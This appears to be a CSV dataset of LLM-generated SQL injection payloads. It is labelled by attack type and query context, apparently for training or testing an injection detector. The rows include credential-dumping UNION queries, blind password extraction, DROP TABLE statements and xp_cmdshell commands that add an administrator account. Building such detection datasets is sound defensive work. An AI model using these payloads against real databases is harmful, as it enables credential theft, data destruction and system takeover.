attack_category,template_context,payload,full_query,label,source,generator_model,round
tautology,search,;/* OR 'x'='y*/,SELECT * FROM products WHERE name LIKE '%;/* OR 'x'='y*/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,search,' OR 1=1/**/,SELECT * FROM products WHERE name LIKE '%' OR 1=1/**/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,%' OR TRUE --,SELECT * FROM products WHERE name LIKE '%%' OR TRUE --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,%' OR TRUE /**/,SELECT * FROM products WHERE name LIKE '%%' OR TRUE /**/%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,'% OR CAST('1' AS INT)=CAST('1' AS INT)--,SELECT * FROM products WHERE name LIKE '%'% OR CAST('1' AS INT)=CAST('1' AS INT)--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,search,"' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#","SELECT * FROM products WHERE name LIKE '%' OR ASCII(SUBSTRING((SELECT USER()),1,1))=65#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,' OR LENGTH((SELECT DATABASE()))>0--,SELECT * FROM products WHERE name LIKE '%' OR LENGTH((SELECT DATABASE()))>0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,search,"; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#","SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:0' UNION ALL SELECT NULL,'',NULL,NULL#%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR '1'='1',SELECT * FROM users WHERE id = ' OR '1'='1',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,user_lookup,' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --,SELECT * FROM users WHERE id = ' OR EXISTS(SELECT * FROM (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1,SELECT * FROM users WHERE id = ; DROP TABLE IF EXISTS temp; SELECT * FROM users WHERE id = ' OR 1>1,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --,SELECT * FROM users WHERE id = ' OR (SELECT 1 FROM users WHERE username = '' AND password = '') --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,"' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username, 1, 1)) = 85 --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,user_lookup,' OR 1 IN (SELECT 1) --,SELECT * FROM users WHERE id = ' OR 1 IN (SELECT 1) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR ASCII('a')=97 --,SELECT * FROM users WHERE id = ' OR ASCII('a')=97 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR (1+(1=1))=2 --,SELECT * FROM users WHERE id = ' OR (1+(1=1))=2 --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,user_lookup,' OR 1=(SELECT 1 FROM users LIMIT 1) --,SELECT * FROM users WHERE id = ' OR 1=(SELECT 1 FROM users LIMIT 1) --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,"1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --","SELECT * FROM orders WHERE status = '1' OR ASCII(SUBSTRING(user(),1,1)) > 90 --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--,SELECT * FROM orders WHERE status = '1' OR 1 IN (SELECT 1 FROM information_schema.tables WHERE table_type LIKE '%TABLE%')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,1' OR 'a'='a' --,SELECT * FROM orders WHERE status = '1' OR 'a'='a' --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
tautology,order_filter,' OR EXISTS(SELECT 1),SELECT * FROM orders WHERE status = '' OR EXISTS(SELECT 1)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,'; DROP TABLE IF EXISTS users;,SELECT * FROM orders WHERE status = ''; DROP TABLE IF EXISTS users;' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,OR ('x'='x,SELECT * FROM orders WHERE status = 'OR ('x'='x' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,order_filter,' OR (1+1)=2 --,SELECT * FROM orders WHERE status = '' OR (1+1)=2 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR (1=1 AND (SELECT 1 FROM dual)) --,SELECT * FROM orders WHERE status = '' OR (1=1 AND (SELECT 1 FROM dual)) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,"' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --","SELECT * FROM orders WHERE status = '' OR 'a'='b' UNION ALL SELECT NULL, NULL, NULL, NULL --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR (NOT(1=2)) ; --,SELECT * FROM orders WHERE status = '' OR (NOT(1=2)) ; --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,order_filter,' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --,SELECT * FROM orders WHERE status = '' OR EXISTS((SELECT 1 FROM (SELECT * FROM orders WHERE 1=1 LIMIT 1))) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,' OR 1; DROP TABLE comments --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR 1; DROP TABLE comments --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR (SELECT 1 FROM users WHERE 1=1) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM users WHERE 1=1) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR ASCII('a')=ASCII('a') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR ASCII('a')=ASCII('a') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,' OR @@VERSION LIKE '%Microsoft%' --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR @@VERSION LIKE '%Microsoft%' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
tautology,comment_insert,'; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --,"INSERT INTO comments (user_id, body) VALUES (1, ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 FROM information_schema.tables WHERE table_name = 'users' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = 'information_schema' AND table_name = 'tables' AND column_name = 'table_name')) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --,"INSERT INTO comments (user_id, body) VALUES (1, ''); EXECUTE xp_cmdshell 'ping -c 4 www.google.com' --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --,"INSERT INTO comments (user_id, body) VALUES (1, ''); DECLARE @x INT; SET @x = 1; IF (@x = 1) PRINT 'Injection successful!' ELSE PRINT 'Injection failed!'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,"'); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --","INSERT INTO comments (user_id, body) VALUES (1, ''); INSERT INTO comments (user_id, body) SELECT user_id, body FROM comments WHERE 1=0 UNION ALL SELECT 1, 'Exploit executed'; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
tautology,comment_insert,'); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --,"INSERT INTO comments (user_id, body) VALUES (1, ''); UPDATE comments SET body = '<script>alert('XSS');</script>' WHERE user_id = 1; --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,' UNION ALL SELECT * FROM information_schema.users --,SELECT * FROM users WHERE username = '' UNION ALL SELECT * FROM information_schema.users --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,--'; EXEC sp_helpdb;,SELECT * FROM users WHERE username = '--'; EXEC sp_helpdb;' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,'; WAITFOR DELAY '0:0:10'--,SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10'--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,login,' OR 1=1 UNION SELECT password FROM admin --,SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT password FROM admin --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR '1'='1' UNION SELECT email FROM staff /*,SELECT * FROM users WHERE username = '' OR '1'='1' UNION SELECT email FROM staff /*' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #,SELECT * FROM users WHERE username = '' OR 2*(SELECT 1/0) = 2 UNION SELECT username FROM accounts #' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,"' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) > 96 UNION SELECT first_name FROM employees //' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --,SELECT * FROM users WHERE username = '' OR (SELECT COUNT(*) FROM orders) = (SELECT COUNT(*) FROM orders) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,login,--') UNION ALL SELECT * FROM domain.admins--,SELECT * FROM users WHERE username = '--') UNION ALL SELECT * FROM domain.admins--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #","SELECT * FROM users WHERE username = '/*'*/ UNION SELECT username, password FROM users WHERE username != 'admin' #' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*","SELECT * FROM users WHERE username = '' OR 1=1 UNION SELECT CONCAT(username, ':', password) FROM auth.credentials /*' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,login,"' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --","SELECT * FROM users WHERE username = '' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1), 1, 1)) <= 65 --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,' OR '1'='1/*',SELECT * FROM products WHERE name LIKE '%' OR '1'='1/*'%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,search,"--%') UNION SELECT username, password FROM users --","SELECT * FROM products WHERE name LIKE '%--%') UNION SELECT username, password FROM users --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,"' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--","SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM info WHERE email = SUBSTRING((SELECT admin_email FROM settings), 1, 1))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,'; EXEC sp_sayHello; UNION SELECT * FROM flags --,SELECT * FROM products WHERE name LIKE '%'; EXEC sp_sayHello; UNION SELECT * FROM flags --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--,SELECT * FROM products WHERE name LIKE '%1' AND LOWER(VERSION())=LOWER((SELECT VERSION() FROM information_schema))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,search,-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--,SELECT * FROM products WHERE name LIKE '%-1' OR (SELECT 1 FROM information_schema.columns WHERE table_name = 'users')--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #,SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT COUNT(*) FROM users WHERE username LIKE 'admin') UNION ALL SELECT NULL NULL NULL NULL #%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,"' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 AND (SELECT 1 FROM (SELECT CONCAT(username, ':', password) AS data FROM users))--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,search,"1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --","SELECT * FROM products WHERE name LIKE '%1' OR 1=1 AND (SELECT ASCII(SUBSTRING((SELECT admin_password FROM settings LIMIT 1), 1, 1))) BETWEEN 48 AND 57 --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123),SELECT * FROM users WHERE id = ' AND EXISTS(SELECT 1 FROM accounts WHERE account_id=123),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,user_lookup,"' UNION SELECT username, password FROM admin_table #","SELECT * FROM users WHERE id = ' UNION SELECT username, password FROM admin_table #",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,user_lookup,/* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users',SELECT * FROM users WHERE id = /* */UNION select /** */*/** */from/** */information_schema.tables/** */where/** */table_schema=database()/** */and/** */table_name<>'users',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,user_lookup,' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --,SELECT * FROM users WHERE id = ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = database() AND table_name != 'users') --,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"'; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --","SELECT * FROM users WHERE id = '; DECLARE @a NVARCHAR(4000); SET @a = DBMS_PIPE.RECEIVE_MESSAGE('BCOE', 5); EXEC sp_executesql @a; --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)","SELECT * FROM users WHERE id = ' AND 1 = CONVERT(INT, 0x4E4F5F4E4F4F4E4F4F4F4F4F4F4F4F4F4F4F4F)",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL),SELECT * FROM users WHERE id = ' AND (SELECT CHAR(66) + CHAR(67) + CHAR(79) + CHAR(101) FROM DUAL),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,user_lookup,"'; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --","SELECT * FROM users WHERE id = '; WAITFOR DELAY '0:0:5'; SELECT username, password FROM admin_table; --",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,"'; UNION SELECT username, password FROM users --","SELECT * FROM orders WHERE status = ''; UNION SELECT username, password FROM users --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,"''""; WAITFOR DELAY '0:0:5' AND 1=1--","SELECT * FROM orders WHERE status = '''""; WAITFOR DELAY '0:0:5' AND 1=1--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--,SELECT * FROM orders WHERE status = '') OR EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name LIKE '%users%')--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,order_filter,"--' UNION SELECT email, phone FROM customers --","SELECT * FROM orders WHERE status = '--' UNION SELECT email, phone FROM customers --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"' OR '1'='1'/*"" UNION SELECT address, city FROM shipping_details */","SELECT * FROM orders WHERE status = '' OR '1'='1'/*"" UNION SELECT address, city FROM shipping_details */' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/","SELECT * FROM orders WHERE status = '(CASE WHEN (SELECT COUNT(*) FROM products) > 0 THEN CONCAT('admin',':','password') ELSE 'invalid' END) /**/' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"/**/' UNION SELECT SSN, DOB FROM identity_info --","SELECT * FROM orders WHERE status = '/**/' UNION SELECT SSN, DOB FROM identity_info --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,order_filter,"; --' UNION SELECT name, email FROM employees; --","SELECT * FROM orders WHERE status = '; --' UNION SELECT name, email FROM employees; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,'; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables),SELECT * FROM orders WHERE status = ''; WAITFOR DELAY '0:0:5' AND (SELECT 1 AS result FROM system_tables)' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,"--' UNION SELECT hostname, IP FROM network_configurations; --","SELECT * FROM orders WHERE status = '--' UNION SELECT hostname, IP FROM network_configurations; --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,order_filter,'); EXECUTE master..xp_cmdshell 'net user administrator /add'; --,SELECT * FROM orders WHERE status = ''); EXECUTE master..xp_cmdshell 'net user administrator /add'; --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --","INSERT INTO comments (user_id, body) VALUES (1, 'IF(COUNT(*) > 0, (SELECT password FROM users WHERE username='admin'), NULL) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
union_based,comment_insert,"1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--","INSERT INTO comments (user_id, body) VALUES (1, '1' AND '1'=(SELECT CAST(ascii(SUBSTRING((SELECT TOP 1 password FROM users ORDER BY user_id), 1, 1)) AS VARCHAR)--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,comment_insert,1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --,"INSERT INTO comments (user_id, body) VALUES (1, '1' UNION ALL SELECT (SELECT title FROM posts WHERE post_id<10 LIMIT 1) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
union_based,comment_insert,"-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --","INSERT INTO comments (user_id, body) VALUES (1, '-- UNION SELECT u.id, CONCAT(u.username, ':', h.password) FROM users u JOIN hashes h ON u.id = h.user_id --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"'; SELECT id, email FROM users /*","INSERT INTO comments (user_id, body) VALUES (1, ''; SELECT id, email FROM users /*')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM employees WHERE department = 'HR') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
union_based,comment_insert,"""; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --","INSERT INTO comments (user_id, body) VALUES (1, '""; SELECT title FROM blog_posts WHERE author_id = (SELECT id FROM authors WHERE name LIKE '%BlogAdmin%') --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
blind_boolean,login,"%"" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--","SELECT * FROM users WHERE username = '%"" OR (SELECT 1 FROM information_schema.tables WHERE table_name='users')--' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,"' OR ASCII(SUBSTRING(password,1,1)) = 97 --","SELECT * FROM users WHERE username = '' OR ASCII(SUBSTRING(password,1,1)) = 97 --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --,SELECT * FROM users WHERE username = '1' OR 1=(SELECT 1 FROM (SELECT * FROM users LIMIT 1) WHERE 1) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
blind_boolean,login,--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--,SELECT * FROM users WHERE username = '--' OR (SELECT 1 FROM users WHERE username LIKE 'admin%')--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--,SELECT * FROM users WHERE username = '' OR (LENGTH(username) > 5 AND EXISTS(SELECT 1 FROM users WHERE username = 'admin'))--' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,"1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --","SELECT * FROM users WHERE username = '1' OR SUBSTR(username, 1, 1) = 'a' AND SUBSTR(password, 1, 1) = 'a' --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
blind_boolean,login,1' OR 1=1 OR username LIKE '%admin%' AND password='any' --,SELECT * FROM users WHERE username = '1' OR 1=1 OR username LIKE '%admin%' AND password='any' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
